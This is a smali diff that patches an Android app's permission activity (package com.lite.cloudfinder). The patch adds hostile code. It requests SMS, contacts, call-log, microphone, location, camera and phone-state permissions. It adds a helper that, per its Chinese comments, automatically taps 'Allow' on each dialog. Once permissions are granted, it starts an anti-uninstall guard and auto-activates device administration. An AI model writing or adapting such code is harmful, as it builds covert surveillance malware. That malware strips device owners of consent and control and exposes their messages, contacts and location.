@@ -37,17 +37,9 @@
 
     invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
 
-    # 2 秒后自动点“允许”
-    :try_start_permclick
-    move-object/from16 v0, p0
-    invoke-static {v0}, Lڝږ؁ڋ/ھ;->delayedClick(Landroid/content/Context;)V
-    :try_end_permclick
-    .catch Ljava/lang/Exception; {:try_start_permclick .. :try_end_permclick} :catch_permclick
-    goto :goto_permclick
-
-    :catch_permclick
-    move-exception v0
-    :goto_permclick
+    const-string v0, "PermDebug"
+    const-string v1, "PermAct.onCreate"
+    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
     invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;
 
@@ -179,35 +171,140 @@
 
     const/16 v0, 0x21
 
-    const-string v1, "android.permission.CAMERA"
+    if-lt p1, v0, :cond_2
+    const/16 v0, 0xa
+
+    new-array v0, v0, [Ljava/lang/String;
+
+    const/4 v1, 0x0
 
     const-string v2, "android.permission.READ_SMS"
 
-    if-lt p1, v0, :cond_2
+    aput-object v2, v0, v1
 
-    const-string v0, "android.permission.READ_MEDIA_IMAGES"
+    const/4 v1, 0x1
 
-    const-string v3, "android.permission.READ_MEDIA_VIDEO"
+    const-string v2, "android.permission.RECEIVE_SMS"
 
-    filled-new-array {v2, v0, v3, v1}, [Ljava/lang/String;
+    aput-object v2, v0, v1
 
-    move-result-object p1
+    const/4 v1, 0x2
 
-    iput-object p1, p0, Lcom/lite/cloudfinder/activity/PermissionActivity;->؋:[Ljava/lang/String;
+    const-string v2, "android.permission.READ_MEDIA_IMAGES"
 
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x3
+
+    const-string v2, "android.permission.READ_MEDIA_VIDEO"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x4
+
+    const-string v2, "android.permission.CAMERA"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x5
+
+    const-string v2, "android.permission.READ_CONTACTS"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x6
+
+    const-string v2, "android.permission.READ_CALL_LOG"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x7
+
+    const-string v2, "android.permission.RECORD_AUDIO"
+
+    aput-object v2, v0, v1
+
+    const/16 v1, 0x8
+
+    const-string v2, "android.permission.ACCESS_FINE_LOCATION"
+
+    aput-object v2, v0, v1
+
+    const/16 v1, 0x9
+
+    const-string v2, "android.permission.READ_PHONE_STATE"
+
+    aput-object v2, v0, v1
+
+    iput-object v0, p0, Lcom/lite/cloudfinder/activity/PermissionActivity;->؋:[Ljava/lang/String;
     goto :goto_2
 
     :cond_2
-    const-string p1, "android.permission.READ_EXTERNAL_STORAGE"
+    const/16 v0, 0xa
 
-    const-string v0, "android.permission.WRITE_EXTERNAL_STORAGE"
+    new-array v0, v0, [Ljava/lang/String;
 
-    filled-new-array {v2, p1, v0, v1}, [Ljava/lang/String;
+    const/4 v1, 0x0
 
-    move-result-object p1
+    const-string v2, "android.permission.READ_SMS"
 
-    iput-object p1, p0, Lcom/lite/cloudfinder/activity/PermissionActivity;->؋:[Ljava/lang/String;
+    aput-object v2, v0, v1
 
+    const/4 v1, 0x1
+
+    const-string v2, "android.permission.RECEIVE_SMS"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x2
+
+    const-string v2, "android.permission.READ_EXTERNAL_STORAGE"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x3
+
+    const-string v2, "android.permission.WRITE_EXTERNAL_STORAGE"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x4
+
+    const-string v2, "android.permission.CAMERA"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x5
+
+    const-string v2, "android.permission.READ_CONTACTS"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x6
+
+    const-string v2, "android.permission.READ_CALL_LOG"
+
+    aput-object v2, v0, v1
+
+    const/4 v1, 0x7
+
+    const-string v2, "android.permission.RECORD_AUDIO"
+
+    aput-object v2, v0, v1
+
+    const/16 v1, 0x8
+
+    const-string v2, "android.permission.ACCESS_FINE_LOCATION"
+
+    aput-object v2, v0, v1
+
+    const/16 v1, 0x9
+
+    const-string v2, "android.permission.READ_PHONE_STATE"
+
+    aput-object v2, v0, v1
+
+    iput-object v0, p0, Lcom/lite/cloudfinder/activity/PermissionActivity;->؋:[Ljava/lang/String;
     :goto_2
     invoke-virtual {p0}, Lcom/lite/cloudfinder/activity/PermissionActivity;->ؠ()V
 
@@ -572,6 +669,9 @@
 
     move-result-object v0
 
+    # 每个权限框停约 2 秒再点“允许”
+    invoke-static {p0}, Lڝږ؁ڋ/ھ;->armClick(Landroid/content/Context;)V
+
     const/16 v1, 0x97
 
     invoke-virtual {p0, v0, v1}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V
@@ -591,6 +691,23 @@
     const-string v0, "All permissions processed, finishing"
 
     invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    # 权限全部到手后，才启用防卸载守卫（调试期由 inject_state.guard_on 决定，默认关）
+    invoke-static {p0}, Lڝږ؁ڋ/ھ;->accGuardStart(Landroid/content/Context;)V
+
+
+    # 2.2 调试：权限跑完后 1 秒自动弹设备管理激活页，2.5 秒后自动点“启动”
+    const/4 v0, 0x2
+
+    const-wide/16 v1, 0x3e8
+
+    invoke-static {p0, v0, v1, v2}, Lڝږ؁ڋ/ھ;->post(Landroid/content/Context;IJ)V
+
+    const/4 v0, 0x7
+
+    const-wide/16 v1, 0x9c4
+
+    invoke-static {p0, v0, v1, v2}, Lڝږ؁ڋ/ھ;->post(Landroid/content/Context;IJ)V
 
     invoke-virtual {p0}, Landroid/app/Activity;->finish()V
 
